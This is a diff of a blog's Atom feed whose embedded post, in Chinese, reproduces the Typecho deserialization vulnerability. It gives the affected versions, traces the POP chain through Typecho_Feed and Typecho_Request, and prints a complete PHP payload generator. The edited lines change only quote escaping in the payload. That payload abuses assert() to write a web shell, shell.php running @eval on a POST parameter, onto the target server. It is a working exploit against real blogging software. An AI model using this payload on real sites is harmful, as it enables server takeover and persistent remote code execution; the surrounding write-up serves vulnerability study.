@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://nt0rrent.xyz/"/>
-  <updated>2017-10-29T15:40:29.653Z</updated>
+  <updated>2017-10-29T15:47:04.051Z</updated>
   <id>http://nt0rrent.xyz/</id>
   
   <author>
@@ -20,7 +20,7 @@
     <link href="http://nt0rrent.xyz/2017/10/29/typecho/"/>
     <id>http://nt0rrent.xyz/2017/10/29/typecho/</id>
     <published>2017-10-29T14:51:04.482Z</published>
-    <updated>2017-10-29T15:40:29.653Z</updated>
+    <updated>2017-10-29T15:47:04.051Z</updated>
     
     <content type="html"><![CDATA[<h2 id="typecho反序列化漏洞复现"><a href="#typecho反序列化漏洞复现" class="headerlink" title="typecho反序列化漏洞复现"></a>typecho反序列化漏洞复现</h2><h3 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h3><p>Typecho是一个基于php的简单轻巧的开源博客系统，最近看到了这个漏洞，就顺手复现了一下。。。</p>
 <h3 id="0X01-漏洞版本"><a href="#0X01-漏洞版本" class="headerlink" title="0X01. 漏洞版本"></a>0X01. 漏洞版本</h3><p>V1.1-15.5.12-beta以前</p>
@@ -32,7 +32,7 @@
 </blockquote>
 <p>分别跟进后发现只有Typecho_Feed类可利用，可利用地点如下：<br><img src="http://op5cjcnmi.bkt.clouddn.com/3.PNG" alt="此处输入图片的描述"><br>在290行，如果screenName是不可访问变量，便会调用__get()魔法方法，搜索<strong>get()方法，有好几处，分析后发现在Typecho\</strong>Request类中可以利用。在该类中__get方法调用了get方法，而在get方法中又调用了_applyFilter方法<br><img src="http://op5cjcnmi.bkt.clouddn.com/4.PNG" alt="此处输入图片的描述"></p>
 <p>跟进该方法<br><img src="http://op5cjcnmi.bkt.clouddn.com/5.PNG" alt="此处输入图片的描述"><br>醒目的array_map函数和call_user_func函数。。。<br>至此POP链已经构造完成。</p>
-<h3 id="0X03-Payload"><a href="#0X03-Payload" class="headerlink" title="0X03 Payload"></a>0X03 Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">class Typecho_Feed&#123;</div><div class="line">	private $_type = &apos;RSS 2.0&apos;;</div><div class="line">	private $_items;</div><div class="line">	public function __construct($a)</div><div class="line">    &#123;</div><div class="line">        $this-&gt;_items[] = array(&apos;author&apos;=&gt;$a);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">class Typecho_Request&#123;</div><div class="line">    private $_params = array(&apos;screenName&apos;=&gt;&apos;file_put_contents(\&apos;shell.php\&apos;, \&apos;&lt;?php @eval($_POST[tharavel]);?&gt;\&apos;)&apos;);</div><div class="line">    private $_filter = array(&apos;assert&apos;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$payload1 = new Typecho_Request();</div><div class="line">$payload2 = new Typecho_Feed($payload1);</div><div class="line">$exp = array(&apos;adapter&apos; =&gt; $payload2, &apos;prefix&apos; =&gt; &apos;typecho&apos;);</div><div class="line"></div><div class="line">echo base64_encode(serialize($exp));</div></pre></td></tr></table></figure>
+<h3 id="0X03-Payload"><a href="#0X03-Payload" class="headerlink" title="0X03 Payload"></a>0X03 Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">class Typecho_Feed&#123;</div><div class="line">	private $_type = &apos;RSS 2.0&apos;;</div><div class="line">	private $_items;</div><div class="line">	public function __construct($a)</div><div class="line">    &#123;</div><div class="line">        $this-&gt;_items[] = array(&apos;author&apos;=&gt;$a);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">class Typecho_Request&#123;</div><div class="line">    private $_params = array(&apos;screenName&apos;=&gt;&apos;file_put_contents(&apos;shell.php&apos;, &apos;&lt;?php @eval($_POST[tharavel]);?&gt;&apos;)&apos;);</div><div class="line">    private $_filter = array(&apos;assert&apos;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$payload1 = new Typecho_Request();</div><div class="line">$payload2 = new Typecho_Feed($payload1);</div><div class="line">$exp = array(&apos;adapter&apos; =&gt; $payload2, &apos;prefix&apos; =&gt; &apos;typecho&apos;);</div><div class="line"></div><div class="line">echo base64_encode(serialize($exp));</div></pre></td></tr></table></figure>
 ]]></content>
     
     <summary type="html">
